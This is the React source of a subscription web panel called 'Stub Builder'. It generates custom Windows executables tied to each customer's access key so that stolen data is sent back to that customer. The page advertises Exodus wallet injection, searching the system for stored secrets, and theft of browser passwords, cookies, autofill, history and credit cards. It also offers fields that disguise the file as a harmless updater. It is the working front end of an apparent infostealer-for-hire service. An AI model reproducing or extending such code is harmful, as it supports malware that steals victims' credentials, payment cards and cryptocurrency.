import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { getJson, postJson } from '../utils/api';
import { getCachedAuthData, getCachedAccessKey, updateCachedAccessKey } from '../utils/authCache';
import { PageLayout } from '../components/PageLayout';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Progress } from '../components/ui/progress';
import { Alert, AlertDescription } from '../components/ui/alert';
import { Badge } from '../components/ui/badge';
import { Separator } from '../components/ui/separator';
import { Skeleton } from '../components/ui/skeleton';
import { Tooltip, TooltipContent, TooltipTrigger } from '../components/ui/tooltip';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '../components/ui/collapsible';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from '../components/ui/alert-dialog';
import { LoadingSpinner } from '../components/common/LoadingSpinner';
import { StatusBadge } from '../components/common/StatusBadge';
import {
  FileUploader,
  FileUploaderContent,
  FileUploaderItem,
  FileInput,
} from '../components/file-uploader';
import { toast } from 'sonner';
import {
  Hammer,
  Download,
  CheckCircle,
  XCircle,
  Loader2,
  ArrowLeft,
  RefreshCw,
  Copy,
  Clock,
  Paintbrush,
  FileIcon,
  AlertTriangle,
  ChevronDown,
  ChevronUp,
  Info,
  Shield,
  Zap,
} from 'lucide-react';

type BuildStatus = 'idle' | 'building' | 'completed' | 'failed';

type BuildData = {
  buildId: string;
  status: BuildStatus;
  message?: string;
  downloadUrl?: string;
  error?: string;
  remainingTime?: number;
};

type UserData = {
  access_key: string;
  id: string;
  username: string;
};

type CustomizationData = {
  icon?: File[];
  fileDescription: string;
  productName: string;
  productVersion: string;
  companyName: string;
  originalFilename: string;
  internalName: string;
};

export function Builder() {
  const navigate = useNavigate();
  const [user, setUser] = useState<UserData | null>(null);
  const [buildData, setBuildData] = useState<BuildData | null>(null);
  const [buildStatus, setBuildStatus] = useState<BuildStatus>('idle');
  const [buildStartTime, setBuildStartTime] = useState<number | null>(null);
  const [elapsedTime, setElapsedTime] = useState(0);
  const [downloadTimeLeft, setDownloadTimeLeft] = useState(300); // 5 minutes
  const [customization, setCustomization] = useState<CustomizationData>({
    fileDescription: '',
    productName: '',
    productVersion: '',
    companyName: '',
    originalFilename: '',
    internalName: '',
  });
  const [isBuilding, setIsBuilding] = useState(false);
  const [isDownloading, setIsDownloading] = useState(false);

  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const elapsedIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const countdownIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Load user data and check for active builds
  useEffect(() => {
    loadUserData();
    checkForActiveBuild();
  }, []);

  // Update elapsed time during build
  useEffect(() => {
    if (buildStatus === 'building' && buildStartTime) {
      elapsedIntervalRef.current = setInterval(() => {
        setElapsedTime(Math.floor((Date.now() - buildStartTime) / 1000));
      }, 1000);
    } else {
      if (elapsedIntervalRef.current) {
        clearInterval(elapsedIntervalRef.current);
        elapsedIntervalRef.current = null;
      }
    }

    return () => {
      if (elapsedIntervalRef.current) {
        clearInterval(elapsedIntervalRef.current);
      }
    };
  }, [buildStatus, buildStartTime]);

  // Download countdown timer
  useEffect(() => {
    if (buildStatus === 'completed' && downloadTimeLeft > 0) {
      countdownIntervalRef.current = setInterval(() => {
        setDownloadTimeLeft((prev) => {
          if (prev <= 1) {
            if (countdownIntervalRef.current) {
              clearInterval(countdownIntervalRef.current);
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    } else {
      if (countdownIntervalRef.current) {
        clearInterval(countdownIntervalRef.current);
        countdownIntervalRef.current = null;
      }
    }

    return () => {
      if (countdownIntervalRef.current) {
        clearInterval(countdownIntervalRef.current);
      }
    };
  }, [buildStatus, downloadTimeLeft]);

  // Cleanup intervals on unmount
  useEffect(() => {
    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
      if (elapsedIntervalRef.current) clearInterval(elapsedIntervalRef.current);
      if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);
    };
  }, []);

  const loadUserData = async () => {
    try {
      // Get cached auth data (will fetch if expired)
      const authData = await getCachedAuthData();
      if (!authData) {
        navigate('/auth');
        return;
      }

      // Set user data
      setUser(authData.user);
      if (authData.csrfToken) {
        (window as any).__csrf = authData.csrfToken;
      }

      // Get access key (will use cache if recent, otherwise fetch)
      const accessKey = await getCachedAccessKey();
      if (accessKey) {
        setUser((prev) => (prev ? { ...prev, access_key: accessKey } : null));
      }
    } catch (error) {
      console.error('Failed to load user data:', error);
      navigate('/auth');
    }
  };

  const checkForActiveBuild = async () => {
    try {
      const response = await getJson('/builder/api/status');

      if (response.hasBuild) {
        const buildId = response.buildId;
        setBuildData({ buildId, status: response.status });
        setBuildStatus(response.status);

        if (response.status === 'building') {
          setBuildStartTime(Date.now());
          startStatusPolling(buildId);
        } else if (response.status === 'completed' && response.downloadUrl) {
          setBuildData((prev) => (prev ? { ...prev, downloadUrl: response.downloadUrl } : null));
        } else if (response.status === 'failed') {
          setBuildData((prev) => (prev ? { ...prev, error: response.error } : null));
        }
      } else {
        setBuildStatus('idle');
        setBuildData(null);
      }
    } catch (error: any) {
      if (error.message.includes('Active subscription required')) {
        navigate('/subscriptions');
        return;
      }
      console.error('Error checking for active build:', error);
      setBuildStatus('idle');
    }
  };

  const startStatusPolling = (buildId: string) => {
    if (pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current);
    }

    pollIntervalRef.current = setInterval(async () => {
      try {
        const response = await getJson(`/builder/api/build/${buildId}`);

        setBuildData((prev) => (prev ? { ...prev, ...response } : null));
        setBuildStatus(response.status);

        if (response.status === 'completed') {
          if (pollIntervalRef.current) {
            clearInterval(pollIntervalRef.current);
            pollIntervalRef.current = null;
          }
          if (response.downloadUrl) {
            setBuildData((prev) => (prev ? { ...prev, downloadUrl: response.downloadUrl } : null));
          }
        } else if (response.status === 'failed') {
          if (pollIntervalRef.current) {
            clearInterval(pollIntervalRef.current);
            pollIntervalRef.current = null;
          }
          setBuildData((prev) => (prev ? { ...prev, error: response.error } : null));
        }
      } catch (error: any) {
        console.error('Failed to poll status:', error);
        if (error.message.includes('Active subscription required')) {
          if (pollIntervalRef.current) {
            clearInterval(pollIntervalRef.current);
            pollIntervalRef.current = null;
          }
          toast.error('Subscription expired during build');
          setTimeout(() => navigate('/subscriptions'), 2000);
        }
      }
    }, 2000);
  };

  const startBuild = async () => {
    if (isBuilding) return;

    // Validate product version format
    if (customization.productVersion) {
      const versionRegex = /^\d{1,2}\.\d{1,2}\.\d{1,2}$/;
      if (!versionRegex.test(customization.productVersion)) {
        toast.error('Invalid Product Version. Use X.X.X (numbers only).');
        return;
      }
    }

    setIsBuilding(true);
    setBuildStartTime(Date.now());
    setElapsedTime(0);

    try {
      const hasCustomization = Object.values(customization).some(
        (value) => value && (typeof value === 'string' ? value.trim() : true),
      );

      let response;
      if (hasCustomization) {
        const formData = new FormData();

        if (customization.icon && customization.icon.length > 0) {
          formData.append('icon', customization.icon[0]);
        }
        if (customization.fileDescription)
          formData.append('fileDescription', customization.fileDescription);
        if (customization.productName) formData.append('productName', customization.productName);
        if (customization.productVersion)
          formData.append('productVersion', customization.productVersion);
        if (customization.companyName) formData.append('companyName', customization.companyName);
        if (customization.originalFilename)
          formData.append('originalFilename', customization.originalFilename);
        if (customization.internalName) formData.append('internalName', customization.internalName);

        response = await fetch('/builder/api/build', {
          method: 'POST',
          headers: { 'X-CSRF-Token': (window as any).__csrf || '' },
          body: formData,
        });
      } else {
        response = await fetch('/builder/api/build', {
          method: 'POST',
          headers: { 'X-CSRF-Token': (window as any).__csrf || '' },
        });
      }

      const data = await response.json();

      if (!response.ok) {
        if (response.status === 403 && data.error === 'Active subscription required') {
          toast.error('Active subscription required to use the stub builder');
          setTimeout(() => navigate('/subscriptions'), 2000);
          return;
        }
        if (response.status === 429 && data.remainingTime) {
          throw new Error(`Build cooldown active. Please wait ${data.remainingTime} seconds.`);
        }
        throw new Error(data.error || 'Failed to start build');
      }

      setBuildData({ buildId: data.buildId, status: data.status });
      setBuildStatus(data.status);

      if (data.status === 'completed' && data.downloadUrl) {
        setBuildData((prev) => (prev ? { ...prev, downloadUrl: data.downloadUrl } : null));
        toast.success('Existing build found! Download is ready.');
      } else if (data.status === 'building') {
        startStatusPolling(data.buildId);
        toast.info('Build already in progress!');
      } else if (data.status === 'started') {
        startStatusPolling(data.buildId);
        toast.success('Build started successfully!');
      } else {
        startStatusPolling(data.buildId);
        toast.success('Build started successfully!');
      }
    } catch (error: any) {
      console.error('Failed to start build:', error);
      toast.error(error.message || 'Failed to start build');
      setBuildStatus('idle');
      setBuildData(null);
    } finally {
      setIsBuilding(false);
    }
  };

  const downloadExecutable = async () => {
    if (!buildData?.downloadUrl || isDownloading) return;

    setIsDownloading(true);
    try {
      const response = await fetch(buildData.downloadUrl);
      if (!response.ok) {
        throw new Error(`Download failed with status: ${response.status}`);
      }

      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = 'user-executable.exe';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(url);

      toast.success('Download completed successfully!');

      // Check status after download
      setTimeout(() => {
        checkForActiveBuild();
      }, 2000);
    } catch (error: any) {
      console.error('Download failed:', error);
      toast.error(`Download failed: ${error.message}`);
    } finally {
      setIsDownloading(false);
    }
  };

  const regenerateAccessKey = async () => {
    try {
      const response = await fetch('/dashboard/api/access-key/regenerate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': (window as any).__csrf || '',
        },
      });

      if (response.ok) {
        const data = await response.json();
        setUser((prev) => (prev ? { ...prev, access_key: data.accessKey } : null));

        // Update cached auth data with new access key
        updateCachedAccessKey(data.accessKey);

        toast.success('Access key regenerated successfully');
      } else {
        const error = await response.json();
        toast.error(error.message || 'Failed to regenerate access key');
      }
    } catch (error) {
      toast.error('Failed to regenerate access key');
    }
  };

  const copyAccessKey = async () => {
    if (!user?.access_key) return;

    try {
      await navigator.clipboard.writeText(user.access_key);
      toast.success('Access key copied to clipboard');
    } catch (error) {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = user.access_key;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      toast.success('Access key copied to clipboard');
    }
  };

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const getProgressValue = () => {
    switch (buildStatus) {
      case 'building':
        return 60;
      case 'completed':
        return 100;
      case 'failed':
        return 100;
      default:
        return 0;
    }
  };

  const getStatusIcon = () => {
    switch (buildStatus) {
      case 'building':
        return <LoadingSpinner size="sm" className="text-info" />;
      case 'completed':
        return <CheckCircle className="h-5 w-5 text-success" />;
      case 'failed':
        return <XCircle className="h-5 w-5 text-destructive" />;
      default:
        return null;
    }
  };

  const getStatusTitle = () => {
    switch (buildStatus) {
      case 'building':
        return 'Building...';
      case 'completed':
        return 'Build Complete';
      case 'failed':
        return 'Build Failed';
      default:
        return 'Build Status';
    }
  };

  const getStatusMessage = () => {
    if (buildData?.message) return buildData.message;
    switch (buildStatus) {
      case 'building':
        return 'Compiling Rust code...';
      case 'completed':
        return 'Build completed successfully!';
      case 'failed':
        return 'Build failed';
      default:
        return 'Checking status...';
    }
  };

  const headerActions = (
    <div className="flex items-center gap-3">
      <Button
        variant="outline"
        onClick={() => navigate('/dashboard')}
        className="flex items-center gap-2"
      >
        <ArrowLeft className="h-4 w-4" />
        <span>Back to Dashboard</span>
      </Button>
    </div>
  );

  return (
    <PageLayout title="Stub Builder" actions={headerActions} showProfile={true}>
      <div className="max-w-4xl mx-auto flex flex-col gap-6">
        {/* Build Status Card */}
        {buildStatus !== 'idle' && (
          <Card>
            <CardHeader>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  {getStatusIcon()}
                  <div>
                    <CardTitle className="text-lg">{getStatusTitle()}</CardTitle>
                    <p className="text-sm text-muted-foreground">{getStatusMessage()}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <StatusBadge status={buildStatus} />
                  {elapsedTime > 0 && (
                    <div className="text-right">
                      <p className="text-sm text-muted-foreground">{elapsedTime}s elapsed</p>
                    </div>
                  )}
                </div>
              </div>
            </CardHeader>
            <CardContent className="flex flex-col gap-4">
              <Progress value={getProgressValue()} className="h-2" />

              {buildStatus === 'failed' && buildData?.error && (
                <Alert variant="destructive">
                  <AlertTriangle className="h-4 w-4" />
                  <AlertDescription>{buildData.error}</AlertDescription>
                </Alert>
              )}

              {buildStatus === 'completed' && buildData?.downloadUrl && (
                <div className="rounded-md border border-success/30 bg-success/10 p-4">
                  <div className="flex items-center justify-between">
                    <div className="flex flex-col gap-1">
                      <h4 className="flex items-center gap-2 font-medium text-success">
                        <CheckCircle className="h-4 w-4" />
                        Build complete
                      </h4>
                      <p className="text-sm text-success/80">
                        Your executable is ready for download.
                      </p>
                    </div>
                    <Button
                      onClick={downloadExecutable}
                      disabled={isDownloading || downloadTimeLeft <= 0}
                    >
                      {isDownloading ? (
                        <LoadingSpinner size="sm" className="mr-2" />
                      ) : (
                        <Download className="h-4 w-4 mr-2" />
                      )}
                      {isDownloading ? 'Downloading…' : 'Download'}
                    </Button>
                  </div>
                  <div className="mt-2 flex items-center text-xs text-success/70">
                    <Clock className="mr-1 h-3 w-3" />
                    Expires in {formatTime(downloadTimeLeft)}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Main Builder Card */}
        <Card>
          <CardHeader>
            <CardTitle>Build Custom Executable</CardTitle>
            <p className="text-muted-foreground">
              Generate an executable with your unique access key embedded
            </p>
          </CardHeader>
          <CardContent className="flex flex-col gap-6">
            {/* Features Section */}
            <div>
              <h3 className="text-lg font-medium mb-2">Features</h3>
              <div className="bg-secondary/30 rounded-lg p-4">
                <ul className="list-disc pl-6 flex flex-col gap-2 text-sm">
                  <li>Inject into exodus desktop wallet</li>
                  <li>Search system for secrets stored in files</li>
                  <li>
                    Retrieve
                    <Badge variant="secondary" className="mx-1">
                      Passwords
                    </Badge>
                    ,
                    <Badge variant="secondary" className="mx-1">
                      Cookies
                    </Badge>
                    ,
                    <Badge variant="secondary" className="mx-1">
                      Autofill
                    </Badge>
                    ,
                    <Badge variant="secondary" className="mx-1">
                      History
                    </Badge>
                    , and
                    <Badge variant="secondary" className="mx-1">
                      Credit Cards
                    </Badge>
                    from browsers
                    <span className="text-muted-foreground ml-1">
                      (currently supports Chrome, Edge, Brave, Firefox, and Librewolf)
                    </span>
                  </li>
                </ul>
              </div>
            </div>

            {/* Access Key Section */}
            <div>
              <div className="flex items-center gap-2 mb-2">
                <Shield className="h-5 w-5 text-primary" />
                <h3 className="text-lg font-medium">Access Key</h3>
                <Tooltip>
                  <TooltipTrigger>
                    <Info className="h-4 w-4 text-muted-foreground" />
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>Your unique identifier embedded in every executable</p>
                  </TooltipContent>
                </Tooltip>
              </div>
              <div className="bg-secondary/30 rounded-lg p-4 flex flex-col gap-4">
                <div className="flex flex-col md:flex-row md:items-center md:gap-6">
                  <div className="flex items-center gap-4 flex-shrink-0">
                    <div className="bg-input border border-border rounded-lg px-4 py-2 min-w-[180px] max-w-xs overflow-x-auto">
                      {user?.access_key ? (
                        <code className="font-mono whitespace-nowrap text-base text-foreground">
                          {user.access_key}
                        </code>
                      ) : (
                        <Skeleton className="h-5 w-32" />
                      )}
                    </div>
                    <Tooltip>
                      <TooltipTrigger asChild>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={copyAccessKey}
                          disabled={!user?.access_key}
                          className="w-[110px]"
                        >
                          <Copy className="h-3 w-3 mr-1" />
                          Copy
                        </Button>
                      </TooltipTrigger>
                      <TooltipContent>
                        <p>Copy access key to clipboard</p>
                      </TooltipContent>
                    </Tooltip>
                    <AlertDialog>
                      <AlertDialogTrigger asChild>
                        <Button variant="destructive" size="sm" className="w-[110px]">
                          <RefreshCw className="h-3 w-3 mr-1" />
                          Regenerate
                        </Button>
                      </AlertDialogTrigger>
                      <AlertDialogContent>
                        <AlertDialogHeader>
                          <AlertDialogTitle>Regenerate Access Key</AlertDialogTitle>
                          <AlertDialogDescription>
                            Are you sure you want to regenerate your access key? This will
                            invalidate your current key and stop past builds from working.
                          </AlertDialogDescription>
                        </AlertDialogHeader>
                        <AlertDialogFooter>
                          <AlertDialogCancel>Cancel</AlertDialogCancel>
                          <AlertDialogAction onClick={regenerateAccessKey}>
                            Regenerate
                          </AlertDialogAction>
                        </AlertDialogFooter>
                      </AlertDialogContent>
                    </AlertDialog>
                  </div>
                  <div className="flex-1 text-sm text-muted-foreground flex flex-col gap-3">
                    <div className="flex items-start gap-2">
                      <Zap className="h-4 w-4 text-primary mt-0.5 flex-shrink-0" />
                      <div>
                        <span className="font-semibold text-foreground">
                          What is the access key?
                        </span>
                        <p className="mt-1">
                          Your access key is a unique identifier that is embedded in every
                          executable you build. It links the executable to your account and enables
                          secure data transmission.
                        </p>
                      </div>
                    </div>
                    <Separator />
                    <div className="flex items-start gap-2">
                      <AlertTriangle className="h-4 w-4 text-destructive mt-0.5 flex-shrink-0" />
                      <div>
                        <span className="font-semibold text-foreground">
                          What does regenerating the access key do?
                        </span>
                        <p className="mt-1">
                          Regenerating your access key will invalidate all past builds. Any
                          executables built with your previous key will no longer send data, and
                          only new builds will work. Use this if you suspect your key is compromised
                          or want to reset access.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Customization Section */}
            <Collapsible>
              <CollapsibleTrigger asChild>
                <Button variant="ghost" className="w-full justify-between p-0 h-auto">
                  <div className="flex items-center gap-2">
                    <Paintbrush className="h-4 w-4" />
                    <h3 className="text-lg font-medium">Customization (Optional)</h3>
                  </div>
                  <ChevronDown className="h-4 w-4" />
                </Button>
              </CollapsibleTrigger>
              <CollapsibleContent className="flex flex-col gap-4">
                <div className="bg-secondary/30 rounded-lg p-4 flex flex-col gap-4">
                  <div className="grid md:grid-cols-2 gap-4">
                    <div className="flex flex-col gap-2">
                      <Label className="flex items-center gap-2">
                        <FileIcon className="h-4 w-4" />
                        Custom Icon (.ico)
                      </Label>
                      <FileUploader
                        value={customization.icon || null}
                        onValueChange={(files) =>
                          setCustomization((prev) => ({ ...prev, icon: files || undefined }))
                        }
                        dropzoneOptions={{
                          accept: {
                            'image/vnd.microsoft.icon': ['.ico'],
                            'image/x-icon': ['.ico'],
                          },
                          maxFiles: 1,
                          maxSize: 300 * 1024, // 300KB
                          multiple: false,
                        }}
                        className="w-full"
                      >
                        <FileUploaderContent>
                          {customization.icon && customization.icon.length > 0 ? (
                            customization.icon.map((file, index) => (
                              <FileUploaderItem key={index} index={index}>
                                <FileIcon className="h-4 w-4" />
                                <span className="truncate">{file.name}</span>
                              </FileUploaderItem>
                            ))
                          ) : (
                            <FileInput className="border-2 border-dashed border-muted-foreground/25 rounded-lg p-6 text-center hover:border-muted-foreground/50 transition-colors">
                              <div className="flex flex-col items-center gap-2">
                                <FileIcon className="h-8 w-8 text-muted-foreground" />
                                <div className="text-sm">
                                  <span className="font-medium text-foreground">
                                    Click to upload
                                  </span>
                                  <span className="text-muted-foreground"> or drag and drop</span>
                                </div>
                                <p className="text-xs text-muted-foreground">
                                  .ico file, max 300KB
                                </p>
                              </div>
                            </FileInput>
                          )}
                        </FileUploaderContent>
                      </FileUploader>
                      <p className="text-xs text-muted-foreground">
                        Max 300KB. Replaces default icon.
                      </p>
                    </div>
                    <div className="flex flex-col gap-2">
                      <Label htmlFor="fileDescription">File Description</Label>
                      <Input
                        id="fileDescription"
                        value={customization.fileDescription}
                        onChange={(e) =>
                          setCustomization((prev) => ({ ...prev, fileDescription: e.target.value }))
                        }
                        maxLength={60}
                        placeholder="e.g., Acme Updater"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <Label htmlFor="productName">Product Name</Label>
                      <Input
                        id="productName"
                        value={customization.productName}
                        onChange={(e) =>
                          setCustomization((prev) => ({ ...prev, productName: e.target.value }))
                        }
                        maxLength={50}
                        placeholder="e.g., Acme Suite"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <Label htmlFor="productVersion">Product Version</Label>
                      <Input
                        id="productVersion"
                        value={customization.productVersion}
                        onChange={(e) =>
                          setCustomization((prev) => ({ ...prev, productVersion: e.target.value }))
                        }
                        maxLength={20}
                        placeholder="e.g., 2.3.1"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <Label htmlFor="companyName">Company Name</Label>
                      <Input
                        id="companyName"
                        value={customization.companyName}
                        onChange={(e) =>
                          setCustomization((prev) => ({ ...prev, companyName: e.target.value }))
                        }
                        maxLength={60}
                        placeholder="e.g., Acme Corp"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <Label htmlFor="originalFilename">Original Filename</Label>
                      <Input
                        id="originalFilename"
                        value={customization.originalFilename}
                        onChange={(e) =>
                          setCustomization((prev) => ({
                            ...prev,
                            originalFilename: e.target.value,
                          }))
                        }
                        maxLength={60}
                        placeholder="e.g., updater.exe"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <Label htmlFor="internalName">Internal Name</Label>
                      <Input
                        id="internalName"
                        value={customization.internalName}
                        onChange={(e) =>
                          setCustomization((prev) => ({ ...prev, internalName: e.target.value }))
                        }
                        maxLength={60}
                        placeholder="e.g., updater"
                      />
                    </div>
                  </div>
                  <Separator />
                  <div className="flex items-start gap-2">
                    <Info className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                    <p className="text-xs text-muted-foreground">
                      Leave blank to use default metadata. Only provided fields are embedded.
                    </p>
                  </div>
                </div>
              </CollapsibleContent>
            </Collapsible>

            {/* Start Build Button */}
            <div className="flex justify-center pt-4">
              <Button
                onClick={startBuild}
                disabled={isBuilding || buildStatus === 'building'}
                size="lg"
                className="px-8"
              >
                {isBuilding ? (
                  <LoadingSpinner size="sm" className="mr-2" />
                ) : (
                  <Hammer className="h-4 w-4 mr-2" />
                )}
                {isBuilding ? 'Starting Build...' : 'Start Build'}
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    </PageLayout>
  );
}
